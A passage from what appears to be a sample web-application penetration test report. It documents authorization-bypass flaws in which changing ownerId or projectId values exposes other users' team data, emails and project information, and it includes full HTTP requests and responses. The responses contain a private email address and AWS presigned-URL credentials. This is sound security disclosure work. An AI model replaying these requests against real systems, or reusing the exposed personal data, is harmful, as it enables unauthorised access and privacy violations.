{"text": "nosniff X-Xss-Protection: 1; mode=block Content-Security-Policy: default-src https: 'unsafe-eval' 'unsafe-inline'; object-src 'none'; connect-src *; img-src https: blob: mediastream: data:; font-src https: data:; worker-src blob: Access-Control-Allow-Origin: https://{URL} Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: GET,POST,PUT,PATCH,DELETE,OPTIONS Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X- Requested-With Vary: Origin,Accept-Encoding Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Content-Disposition: attachment; filename=json.txt X-Content-Type-Options: nosniff {\"status\":\"success\",\"teamId\":\"123\"} The following screenshot shows the NOTREAL team appearing in dev+assessor_purplesec.us@the company dashboard.\\nFigure 9 - GUI Authorization Bypass An attacker can leverage this vulnerability to discover information about application users. Because the attacker has invited themselves to the team, information on the team's owners will be returned to the attacker, including their private email addresses. After creating the team NOTREAL8 and assigning it to the user with the ownerId 3405, the following information is returned to the attacker: GET /ajax/team/my HTTP/2 Host: {URL} Cookie:<snip> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://{URL}/dashboard/no-referrer Content-Type: application/x-www-form-urlencoded;charset=UTF-8 X-Requested-With: XMLHttpRequest Dnt: 1 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Cache-Control: max-age=0 Te: trailers Connection: close\\nDate: Wed, 28 Jul 2021 22:50:04 GMT Content-Type: application/json; charset=utf-8 Content-Length: 18640 Server: Apache/2.4 Strict-Transport-Security: max-age=31536000; includeSubdomains X-Frame-Options: SAMEORIGIN X-Content-Type-Options: nosniff X-Xss-Protection: 1; mode=block Content-Security-Policy: default-src https: 'unsafe-eval' 'unsafe-inline'; object-src 'none'; connect-src *; img- src https: blob: mediastream: data:; font-src https: data:; worker-src blob: Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Content-Disposition: attachment; filename=json.txt X-Content-Type-Options: nosniff Vary: Accept-Encoding {\"id\":\"128\",\"ownerId\":\"3405\",\"name\":\"NOTREAL8\",\"longitudinalLink\":\"\",\"theme\":null,\"createdAt\":\"2021-07-28 22:49:59\",\"isPublic\":true,\"orgName\":\"ABinBev\",\"orgId\":\"23\",\"members\":[{\"id\":\"3401\",\"email\":\"assessor@pur plesec.us\",\"name\":\"Testtestttt\",\"avatarUrl\":\"https:\\/\\/qa-stimulus.s3.us-west- 2.amazonaws.com\\/img\\/avatars\\/ab866751b1a395d24337ef7b83b05e7c-25x25.png?X-Amz-Content- Sha256=UNSIGNED-PAYLOAD&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz- Credential=AKIAWVJLWKOF7IEQEZN6%2F20210728%2Fus-west-2%2Fs3%2Faws4_request&X-Amz- Date=20210728T225004Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz- Signature=8805871b7546140360532cbccf74dfc413410273080a8871c30ec7562d7c8cce\",\"isOrgAdmin\":fal se},{\"id\":\"3405\",\"email\":\"rafael.silva@ab-inbev.com\",\"name\":\"Rafael\",\"avatarUrl\":\"https:\\/\\/qa-stimulus.s3.us- west-2.amazonaws.com\\/img\\/avatars\\/default-25x25.png?X-Amz-Content-Sha256=UNSIGNED- PAYLOAD&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz- Credential=AKIAWVJLWKOF7IEQEZN6%2F20210728%2Fus-west-2%2Fs3%2Faws4_request&X-Amz- Date=20210728T225004Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz- Signature=d1ea9a7ab2290838e113a362e4038ec0c09798f7b01d5631df44a3f0600a09f1\",\"isOrgAdmin\":fals e}],\"projects\":[]}\\nSince the ownerId parameter is a sequential 4-digit number, this attack can be easily automated to quickly disclose information on all application users. Instance 2 It is possible to retrieve other users' project takeaway information. Changing the \"projectId\" parameter in the following HTTP request will reveal project information associated with that \"projectId.\" This is despite the user having no access to that project. The assessor@purplesec.us user has no authorization to view project information associated with the projectId 32489. However, the following HTTP request shows that the project's takeaway information successfully returned to the attacker: GET /ajax/takeaways/takeaways?projectId=32489 HTTP/2 Host: {URL} Cookie: <snip> Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://{URL}/dashboard/no-referrer Content-Type: application/x-www-form-urlencoded;charset=UTF-8 X-Requested-With: XMLHttpRequest Dnt: 1 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Cache-Control: max-age=0 Te: trailers Connection: close\\nDate: Wed, 28 Jul 2021 23:20:49 GMT Content-Type: application/json; charset=utf-8 Content-Length: 641 Server: Apache/2.4 Strict-Transport-Security: max-age=31536000; includeSubdomains X-Frame-Options: SAMEORIGIN X-Content-Type-Options: nosniff X-Xss-Protection: 1; mode=block Content-Security-Policy: default-src https: 'unsafe-eval' 'unsafe-inline'; object-src 'none'; connect-src *; img- src https: blob: mediastream: data:; font-src https: data:; worker-src blob: Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Content-Disposition: attachment; filename=json.txt X-Content-Type-Options: nosniff Vary: Accept-Encoding {\"questions\":{\"updatedAt\":\"2020-07-15 23:04:27\",\"sections\":[{\"sectionId\":\"364\",\"position\":\"1\",\"sectionText\":\"\",\"questions\":[{\"questionId\":\"1102\",\"posit ion\":\"1\",\"questionText\":\"What was the biggest takeaway you had from today's conversation?\"},{\"questionId\":\"1103\",\"position\":\"2\",\"questionText\":\"What did you learn?\"},{\"questionId\":\"1104\",\"position\":\"3\",\"questionText\":\"What action would you take based on what you heard today?\"}]},{\"sectionId\":\"365\",\"position\":\"2\",\"sectionText\":\"ok\",\"questions\":[{\"questionId\":\"1105\",\"position\":\"1\",\" questionText\":\"ok\"}]}]},\"lastSavedText\":\"Last saved by name@gmail.com on 11:04 pm, July 15, 2020\"}\\nAn attacker can easily automate this attack to retrieve all application project takeaway information stored on the application: Figure 10 - Project Takeaway Information\\nOpen Redirect Severity: High", "metadata": {"doc_id": "Web-Application-Penetration-Test-Sample-Report", "chunk_id": 3}}